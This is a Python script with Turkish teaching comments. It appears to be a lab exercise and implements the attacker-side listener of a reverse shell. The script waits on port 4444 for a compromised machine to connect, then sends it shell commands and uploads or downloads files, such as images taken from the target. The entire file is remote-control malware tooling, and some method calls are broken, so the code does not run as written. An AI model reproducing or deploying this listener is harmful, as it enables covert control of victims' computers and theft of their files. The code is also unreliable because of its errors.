import socket
import base64
import simplejson

class SocketListener:
    # instance ile sinif arasinda baglanti kuran keyword(*self*)
    # bu siniftan olusturulan objeleri self ile attributelere baglariz
    def __init__(self,ip,port): # olusturulan her obje icin yapilacak islemleri barindiriyor
        # socket icinden bir instance olusturup baglanti kurduk
        my_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        # olusturulan bu instance nin birden fazla kez kullanilabilmesini mumkun hale getirir.
        my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        # dinleyecegimiz cihaza ait bilgiler .bind icinde
        my_listener.bind((ip,port))
        # 0 = backlog value --> kac tane baglantidan sonra baglanti almak istemedigimiz
        my_listener.listen(0)
        print("Listening...")
        # acilan baglanti - hangi adresten
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection OK from" + str(my_address))

    def json_send(self,data):
        # dumps bizden bir data bekler gondermek icin json formatina cevirir.
        json_data = simplejson.dumps(data)
        # diger tafa json formatindaki datayi gonderiyoruz.
        self.my_connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command_execution(self,command_input):
        self.json_send(command_input)
        if command_input[0] == "quit":
            self.my_connection.close()
            exit()
        return self.json.receive()

    def save_file(self,path,content):
        # write binary izni verdik
        with open(path,"wb") as my_file:
            # hedef cihazdan indirecegimiz jpeg dosyasinda sorun yasamamak icin base64 decode kullanacagiz
            my_file.write(base64.b64decode(content))
            return "Download OK"

    def get_file_content(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def start_listener(self):
        while True:
            # kullanicidan komut alindi
            command_input = raw_input("Enter command: ")
            # split komutuna verilen parametre her goruldugunde liste oradan bolunur
            # ornegin "cd Desktop" vs...
            command_input = command_input.split(" ")
            # alinan komut yollandi
            try:
                if command_input[0] == "upload":
                    my_file_content = self.get.file_content(command_input[1])
                    command_input.append(my_file_content)

                command_output = self.command_execution(command_input)

                if command_input[0] == "download" and "Error !" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)
            except Exception:
                command_output = "Error !"
            print(command_output)

my_socket_listener = SocketListener("10.0.2.10",4444)
my_socket_listener.start_listener()